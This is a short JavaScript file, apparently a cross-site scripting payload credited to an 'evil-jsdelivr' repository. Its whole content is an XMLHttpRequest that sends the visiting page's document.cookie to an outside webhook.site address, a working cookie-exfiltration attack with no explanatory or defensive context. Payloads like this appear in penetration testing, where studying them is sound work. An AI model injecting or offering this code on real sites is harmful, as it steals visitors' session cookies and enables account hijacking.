// idea is from https://github.com/mukarramkhalid
// https://github.com/mukarramkhalid/evil-jsdelivr/blob/main/evil.js
var xhttp = new XMLHttpRequest();
xhttp.open('GET', 'https://webhook.site/d48f0cc1-1717-4ccf-b4d6-c3034ce930e5/?' + document.cookie, true);
xhttp.send();
